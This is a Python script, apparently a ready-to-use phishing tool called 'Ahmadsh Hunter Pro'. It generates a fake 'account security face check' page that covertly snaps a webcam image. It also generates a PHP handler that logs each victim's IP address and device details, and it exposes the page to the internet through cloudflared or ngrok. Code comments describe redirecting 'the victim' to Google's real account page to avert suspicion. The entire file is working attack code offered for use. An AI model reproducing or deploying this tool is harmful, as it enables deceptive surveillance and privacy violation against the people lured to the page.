import os
import subprocess
import time
import sys

# --- ألوان التنسيق ---
G = '\033[1;32m'
R = '\033[1;31m'
W = '\033[1;37m'
C = '\033[1;36m'

# --- إنشاء الملفات تلقائياً داخل الكود ---
def setup_environment():
    if not os.path.exists('captures'):
        os.makedirs('captures')
    
    # ملف الـ PHP لمعالجة البيانات
    php_code = '''<?php
$date = date('d-m-Y_H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$data = $_POST['canvasData'];

if (!empty($data)) {
    $img = str_replace('data:image/png;base64,', '', $data);
    $img = str_replace(' ', '+', $img);
    $fileData = base64_decode($img);
    $fileName = 'captures/cam_'.$ip.'_'.$date.'.png';
    file_put_contents($fileName, $fileData);
}
file_put_contents("captures/log.txt", "IP: $ip | Date: $date | Device: $agent\\n", FILE_APPEND);
?>'''
    with open("post.php", "w") as f: f.write(php_code)

    # ملف الـ HTML (تمويه فحص الأمان الجديد)
    html_code = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Security Check | فحص الأمان</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
        .icon { width: 60px; height: 60px; background: #1a73e8; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; margin-bottom: 20px; }
        h2 { color: #202124; font-size: 22px; margin-bottom: 10px; }
        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; }
        button { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; }
        #loader { display: none; margin-top: 20px; color: #1a73e8; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon"><svg fill="white" width="30" height="30" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg></div>
        <h2>فحص أمان الحساب</h2>
        <p>لضمان حماية خصوصيتك، نحتاج إلى إجراء فحص سريع للوجه للتأكد من ملكية الحساب.</p>
        <button id="btn" onclick="start()">بدء الفحص الآن</button>
        <div id="loader">جاري الفحص... يرجى الانتظار</div>
    </div>
    <video id="video" width="0" height="0" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        function start() {
            document.getElementById('btn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                video.srcObject = stream;
                setTimeout(() => {
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const canvasData = canvas.toDataURL('image/png');
                    fetch('post.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: 'canvasData=' + encodeURIComponent(canvasData)
                    }).then(() => { 
                        // توجيه الضحية لصفحة جوجل الرسمية لإبعاد الشبهة
                        location.href = "https://myaccount.google.com/"; 
                    });
                }, 3000); // 3 ثواني لزيادة واقعية الفحص
            }).catch(err => { 
                alert("خطأ: يجب السماح بالكاميرا لإتمام عملية التحقق الأمني.");
                location.reload();
            });
        }
    </script>
</body>
</html>'''
    with open("index.html", "w") as f: f.write(html_code)

def banner():
    os.system('clear')
    print(f"""
    {C}   _____ _                      _       _     
    {C}  |  _  | |__  _ __ ___   __ _  __| | ___| |__  
    {C}  | |_| | '_ \| '_ ` _ \ / _` |/ _` |/ __| '_ \ 
    {C}  |  _  | | | | | | | | | (_| | (_| |\__ \ | | |
    {C}  |_| |_|_| |_|_| |_| |_|\__,_|\__,_||___/_| |_|
    {G}       >> Ahmadsh Hunter Pro v2.5 <<
    {W} ----------------------------------------------
    {G}  [+] Created By: Ahmadsh (ahmadshh208)
    {G}  [+] Feature: Auto-Cam + IP + Device Info
    {W} ----------------------------------------------
    """)

def start():
    setup_environment()
    banner()
    print(f"{W}[1] Start Cloudflared {G}(Recommended)")
    print(f"{W}[2] Start Ngrok")
    print(f"{W}[3] View Results (IPs & Photos)")
    print(f"{W}[4] Exit")
    
    choice = input(f"\n{G}ahmadsh@hunter:~# {W}")
    
    if choice in ['1', '2']:
        print(f"\n{G}[+] Starting PHP Server...")
        subprocess.Popen(['php', '-S', '127.0.0.1:8080'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        
        if choice == '1':
            os.system("cloudflared tunnel --url http://127.0.0.1:8080")
        else:
            token = input(f"{C}[?] Enter Ngrok Token: {W}")
            if token: os.system(f"ngrok authtoken {token}")
            os.system("ngrok http 8080")
            
    elif choice == '3':
        print(f"\n{C}--- Logs ---{W}")
        if os.path.exists("captures/log.txt"):
            with open("captures/log.txt", "r") as f: print(f.read())
        print(f"\n{C}--- Photos ---{W}")
        os.system("ls captures/*.png")
        input(f"\n{G}Press Enter to return...")
        start()
    else:
        sys.exit()

if __name__ == "__main__":
    try:
        start()
    except KeyboardInterrupt:
        print(f"\n{R}Stopped.")
        
